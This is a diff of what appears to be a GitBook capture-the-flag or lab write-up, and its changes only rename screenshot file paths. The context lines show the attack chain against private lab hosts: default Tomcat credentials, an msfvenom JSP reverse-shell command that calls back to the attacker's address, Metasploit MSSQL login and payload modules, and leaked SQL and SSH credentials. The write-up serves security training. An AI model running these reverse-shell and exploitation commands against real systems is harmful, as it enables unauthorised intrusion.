@@ -233,7 +233,7 @@ tomcat:s3cret
 use exploit/multi/http/tomcat_mgr_upload)
 ```
 
-![](<../../../.gitbook/assets/image (15).png>)
+![](<../../../.gitbook/assets/image (15) (1).png>)
 
 ```bash
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=172.16.64.10 LPORT=4444 -f war -o revshell.war
@@ -247,7 +247,7 @@ msfvenom -p java/jsp_shell_reverse_tcp LHOST=172.16.64.10 LPORT=4444 -f war -o r
 
 ![](<../../../.gitbook/assets/image (61) (1).png>)
 
-![](<../../../.gitbook/assets/image (64).png>)
+![](<../../../.gitbook/assets/image (64) (1).png>)
 
 ![](<../../../.gitbook/assets/image (14).png>)
 
@@ -258,9 +258,9 @@ python3 -c 'import pty; pty.spawn("/bin/bash")'
 
 ![](<../../../.gitbook/assets/image (21).png>)
 
-![](<../../../.gitbook/assets/image (23).png>)
+![](<../../../.gitbook/assets/image (23) (1).png>)
 
-![](<../../../.gitbook/assets/image (39).png>)
+![](<../../../.gitbook/assets/image (39) (1).png>)
 
 ```
 tomcat:tomcat
@@ -268,19 +268,19 @@ tomcat:s3cret
 role1:tomcat
 ```
 
-![](<../../../.gitbook/assets/image (40).png>)
+![](<../../../.gitbook/assets/image (40) (1).png>)
 
-![](<../../../.gitbook/assets/image (17).png>)
+![](<../../../.gitbook/assets/image (17) (1).png>)
 
 ![](<../../../.gitbook/assets/image (27).png>)
 
 ![](<../../../.gitbook/assets/image (22) (1).png>)
 
-![](<../../../.gitbook/assets/image (55).png>)
+![](<../../../.gitbook/assets/image (55) (1).png>)
 
 ## Enumeration - 172.16.64.140
 
-![](<../../../.gitbook/assets/image (53).png>)
+![](<../../../.gitbook/assets/image (53) (1).png>)
 
 ![](<../../../.gitbook/assets/image (41).png>)
 
@@ -304,7 +304,7 @@ admin:admin
 
 ### Exploitation + Credentials
 
-![](<../../../.gitbook/assets/image (36).png>)
+![](<../../../.gitbook/assets/image (36) (1).png>)
 
 ```
 Driver={SQL Server};Server=foosql.foo.com;Database=;Uid=fooadmin;Pwd=fooadmin;
@@ -319,7 +319,7 @@ Driver={SQL Server};Server=foosql.foo.com;Database=;Uid=fooadmin;Pwd=fooadmin;
 use auxiliary/scanner/mssql/mssql_login 
 ```
 
-![](<../../../.gitbook/assets/image (34).png>)
+![](<../../../.gitbook/assets/image (34) (1).png>)
 
 {% embed url="https://www.offensive-security.com/metasploit-unleashed/hunting-mssql" %}
 
@@ -337,15 +337,15 @@ use windows/mssql/mssql_payload
 
 ![](<../../../.gitbook/assets/image (4).png>)
 
-![](<../../../.gitbook/assets/image (63).png>)
+![](<../../../.gitbook/assets/image (63) (1).png>)
 
 ![](<../../../.gitbook/assets/image (66).png>)
 
-![](<../../../.gitbook/assets/image (54).png>)
+![](<../../../.gitbook/assets/image (54) (1).png>)
 
 ![](<../../../.gitbook/assets/image (32).png>)
 
-![](<../../../.gitbook/assets/image (38).png>)
+![](<../../../.gitbook/assets/image (38) (1).png>)
 
 ```
 ssh://developer:dF3334slKw@172.16.64.182:22
@@ -359,11 +359,11 @@ password: dF3334slKw
 ssh developer@172.16.64.182
 ```
 
-![](<../../../.gitbook/assets/image (62).png>)
+![](<../../../.gitbook/assets/image (62) (1).png>)
 
 ![](<../../../.gitbook/assets/image (18).png>)
 
 ### Flag
 
-![](<../../../.gitbook/assets/image (51).png>)
+![](<../../../.gitbook/assets/image (51) (1).png>)
 
